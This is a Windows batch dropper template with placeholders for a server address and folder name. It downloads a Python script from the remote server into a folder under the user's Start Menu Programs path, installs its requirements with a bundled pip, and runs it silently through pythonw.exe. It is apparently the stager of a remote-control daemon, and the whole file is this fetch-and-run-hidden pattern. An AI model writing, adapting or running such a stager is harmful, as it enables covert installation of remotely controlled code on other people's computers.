@echo off
curl {{ server_address }}resources/daemon/run.py -o "%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\run.pyw"
"%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\Lib\site-packages\pip\__main__.py" install --upgrade -r "%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\requirements.txt"
"%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\pythonw.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\run.pyw"